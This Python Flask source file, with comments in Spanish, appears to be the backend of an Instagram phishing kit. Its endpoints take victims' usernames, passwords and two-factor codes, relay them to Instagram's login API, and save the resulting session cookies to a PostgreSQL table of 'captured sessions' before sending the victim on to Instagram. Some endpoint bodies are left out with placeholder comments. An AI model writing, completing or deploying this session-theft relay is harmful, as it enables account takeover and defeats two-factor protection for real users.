# app.py (Versión con Base de Datos PostgreSQL)

import os
import json
import requests
from flask import Flask, request, jsonify, redirect
from flask_sqlalchemy import SQLAlchemy # NUEVA LIBRERÍA

# --- CONFIGURACIÓN DE SEGURIDAD Y APLICACIÓN ---
app = Flask(__name__)
app.secret_key = os.environ.get('FLASK_SECRET_KEY', 'SUPER_SECRETO_Y_SEGURO_CAMBIAR_ESTO')

# CONFIGURACIÓN DE POSTGRESQL
# Lee la variable de entorno que configuramos en Render
app.config['SQLALCHEMY_DATABASE_URI'] = os.environ.get('DATABASE_URL')
# Deshabilitar seguimiento de modificaciones para ahorrar recursos
app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False 

db = SQLAlchemy(app)

# ----------------------------------------------------------------------
# DEFINICIÓN DEL MODELO DE BASE DE DATOS
# ----------------------------------------------------------------------
class CapturedSession(db.Model):
    """Modelo para almacenar las sesiones de Instagram capturadas."""
    id = db.Column(db.Integer, primary_key=True)
    username = db.Column(db.String(80), unique=True, nullable=False)
    # Almacenamos las cookies como texto JSON.
    cookies_json = db.Column(db.Text, nullable=False) 
    capture_time = db.Column(db.DateTime, default=db.func.current_timestamp())

    def __repr__(self):
        return f'<Session {self.username}>'

# ----------------------------------------------------------------------
# LÓGICA DE INICIO DE SESIÓN Y AUTENTICACIÓN (Resto del Código)
# ----------------------------------------------------------------------

USER_AGENT = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36'
INSTAGRAM_LOGIN_URL = 'https://www.instagram.com/accounts/login/ajax/'
INSTAGRAM_2FA_URL = 'https://www.instagram.com/accounts/login/ajax/two_factor/'
TEMP_SESSION_STORAGE = {} # Sigue siendo necesario para guardar temporalmente la sesión.

def get_session_headers(session):
    """Genera los encabezados necesarios para Instagram, incluyendo el CSRF token."""
    csrf_token = session.cookies.get('csrftoken')
    return {
        'User-Agent': USER_AGENT,
        'X-Requested-With': 'XMLHttpRequest',
        'X-CSRFToken': csrf_token,
        'Referer': 'https://www.instagram.com/'
    }

# ----------------------------------------------------------------------
# FUNCIÓN DE GUARDADO EN BASE DE DATOS
# ----------------------------------------------------------------------
def save_session_to_db(username, cookies_dict):
    """Guarda las cookies de sesión en la base de datos."""
    try:
        cookies_json = json.dumps(cookies_dict)
        
        # Crear un nuevo registro
        new_session = CapturedSession(username=username, cookies_json=cookies_json)
        
        # Añadir y confirmar (commit)
        db.session.add(new_session)
        db.session.commit()
        print(f"✅ Sesión de {username} guardada en PostgreSQL.")
        return True
    except Exception as e:
        print(f"❌ ERROR al guardar la sesión de {username} en la BD: {e}")
        db.session.rollback() # Deshacer si hubo un error.
        return False
        
# ----------------------------------------------------------------------
# ENDPOINT 1: RECEPCIÓN DE IDENTIFICADOR Y CONTRASEÑA (PASO 1)
# ----------------------------------------------------------------------
@app.route('/api/login-step1', methods=['POST'])
def handle_step1():
    # ... (Lógica de validación, creación de requests.Session(), etc. sin cambios)
    # ... (omito el código intermedio por brevedad, el cuerpo es el mismo)
    
    # Después de la respuesta de Instagram (response = s.post(...))
    res_json = response.json()
    
    # ... (Lógica de 2FA requerido y Fallo de credenciales sin cambios)
    
    if res_json.get('authenticated'):
        # --- CASO B: INICIO DE SESIÓN DIRECTO (Sin 2FA) ---
        
        final_cookies = s.cookies.get_dict()
        
        # 🚨 AHORA LLAMAMOS A LA FUNCIÓN DE GUARDADO EN BD
        save_session_to_db(username, final_cookies) 
        
        # Enviar respuesta de éxito al cliente para redirigir a Instagram
        return jsonify({
            "success": True, 
            "redirect_step": 99, 
            "message": "Autenticación directa exitosa"
        })
        
    # ... (Resto del código del endpoint sin cambios)
    # ...

# ----------------------------------------------------------------------
# ENDPOINT 2: RECEPCIÓN DEL CÓDIGO 2FA (PASO 3)
# ----------------------------------------------------------------------
@app.route('/api/login-step2', methods=['POST'])
def handle_step2():
    # ... (Lógica de validación, recuperación de sesión, etc. sin cambios)
    # ... (omito el código intermedio por brevedad, el cuerpo es el mismo)
    
    # Después de la respuesta de 2FA (response = s.post(...))
    res_json = response.json()
    
    # ... (Lógica de Código 2FA incorrecto sin cambios)
    
    if res_json.get('authenticated'):
        # --- CASO A: 2FA CORRECTO Y SESIÓN CAPTURADA ---
        
        final_cookies = s.cookies.get_dict()
        
        # 🚨 AHORA LLAMAMOS A LA FUNCIÓN DE GUARDADO EN BD
        save_session_to_db(temp_data['username'], final_cookies)

        # 5. Limpieza y respuesta al cliente
        del TEMP_SESSION_STORAGE[temp_id] 
        return jsonify({
            "success": True, 
            "redirect_step": 99, 
            "message": "Autenticación 2FA exitosa. Redirigiendo."
        })
    # ... (Resto del código del endpoint sin cambios)
    # ...

# ----------------------------------------------------------------------
# INICIALIZACIÓN DE LA APLICACIÓN
# ----------------------------------------------------------------------
with app.app_context():
    # Crea la tabla 'captured_session' en la base de datos si no existe
    db.create_all() 

if __name__ == '__main__':
    # Para pruebas locales. 
    app.run(host='0.0.0.0', port=5000)
